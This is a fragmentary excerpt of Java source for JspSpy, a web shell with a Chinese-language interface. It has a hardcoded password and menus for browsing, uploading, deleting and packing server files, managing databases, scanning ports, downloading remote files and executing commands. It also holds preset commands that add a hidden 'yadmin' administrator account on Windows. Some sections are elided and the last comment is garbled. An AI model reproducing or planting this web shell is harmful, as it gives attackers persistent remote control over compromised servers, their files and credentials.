...
* Date 2018-07-05
*/
private static final String PW = "xx123"; //password
...
// request = new MyRequest(request); Tomcat7.x error  HttpServletRequest myrequest = new MyRequest(request);
...
try {
PrintWriter out = response.getWriter();
out.println("<html><head><title>JspSpy Codz</title><style type=\"text/css\">"+
"body,td{font: 12px Arial,Tahoma;line-height: 16px;}"+
".input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;height:22px;}"+
".area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}"+
".bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:23px;line-height:22px;}"+
...
"	  "+
"<span style=\"font:11px Verdana;\">Copyright &copy; 2018 "+
"    </form>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
out.println("<h2>文件管理 - 当前磁盘: &quot;"+(cr.indexOf("/") == 0?"/":currentRoot.getPath())+"&quot; 总计: "+Util.getSize(currentRoot.getTotalSpace(),'G')+"</h2>");
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
...
"<input class=\"input\" name=\"file\" value=\"\" type=\"file\" />"+
"<input class=\"bt\" name=\"doupfile\" value=\"Upload\" type=\"submit\" /></div>"+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(WEB_ROOT)+"'}).subdir()\">WEB目录</a>"+
" | <a href=\"javascript:new fso({path:'"+Util.convertPath(SHELL_DIR)+"'}).subdir()\">Shell文件夹</a>"+
...
"  <td width=\"16%\">修改日期</td>"+
"  <td width=\"10%\">大小</td>"+
"  <td width=\"20%\">读/写/执行</td>"+
"  <td width=\"22%\">&nbsp;</td>"+
"</tr>");
if (file.getParent() != null) {
out.println("<tr class=alt1>"+
"<td align=\"center\"><font face=\"Wingdings 3\" size=4>=</font></td>"+
"<td nowrap colspan=\"5\"><a href=\"javascript:new fso({path:'"+Util.convertPath(file.getAbsolutePath())+"'}).parent()\">上级目录</a></td>"+
"</tr>");	
}
int dircount = 0;
int filecount = 0;
...
"<td nowrap><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).removedir()\">删除</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">移动</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack()\">压缩</a></td>"+
"</tr>");
} else {
filecount++;
...
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">移动</a> | "+
"<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).vEditProperty()\">属性</a>");
...
out.println(" | <a href=\"javascript:alert('Dont Support RAR,Please Use WINRAR');\">解压</a>");
} else {
out.println(" | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack()\">压缩</a>");
}
out.println("</td>"+
"</tr>");
}
...
"  <td><a href=\"javascript:new fso({}).packBatch();\">压缩选中</a> - <a href=\"javascript:new fso({}).deleteBatch();\">删除选中</a></td>"+
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
response.getWriter().println("<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright (C) 2018 <a href=\"\" target=\"_blank\">/</a>&nbsp;&nbsp;<a target=\"_blank\" href=\"\"></a> All Rights Reserved."+
"</div>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
"<select onchange=\" document.getElementById(\'command\').value=\'cmd.exe /c\'+\' \'+this.options[this.selectedIndex].text\" name=\"command\" id=\"command\" >"+
"  <option value=\"\" selected>选择命令执行..</option>"+
...
"  <option value=\"net user yadmin ya!dmin /add\">net user yadmin ya!dmin /add</option>"+
"  <option value=\"net localgroup administrators yadmin /add\">net localgroup administrators yadmin /add</option>"+
"  <option value=\"net user yadmin /del\">net user yadmin /del</option>"+
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
PrintWriter out = response.getWriter(); // response.getWriter().print() 可以输出二进制流
out.println("<form action=\""+SHELL_NAME+"\" method=\"post\" name=\"doForm\"></form>"+
"<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">"+
"	<tr class=\"head\">"+
"		<td><span style=\"float:right;\"><a href=\"\" target=\"_blank\">JspSpy Ver+: 2018</a></span>"+request.getHeader("host")+" ("+InetAddress.getLocalHost().getHostAddress()+")</td>"+
"	</tr>"+
"	<tr class=\"alt1\"><td>"+

"			<a href=\"javascript:doPost({o:'fileList'});\">文件管理</a> | "+
"			<a href=\"javascript:doPost({o:'vConn'});\">数据库管理</a> | "+
"			<a href=\"javascript:doPost({o:'vPortScan'});;\">端口扫描</a> | "+

"			<a href=\"javascript:doPost({o:'vs'});\">命令执行</a> | "+
"			<a href=\"javascript:doPost({o:'vd'});\">远程文件下载</a> | "+
"			<a href=\"javascript:doPost({o:'jspEnv'});\">JSP环境探针</a> "+
...
"			<a style=\" float:right; \" href=\"javascript:doPost({o:'logout'});\">注销</a> | "+
"	</tr>"+
"</table>");
if (JSession.getAttribute(MSG) != null) {
Util.outMsg(out,JSession.getAttribute(MSG).toString());
...
new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//ии?????????иж???иибд??????????????????????
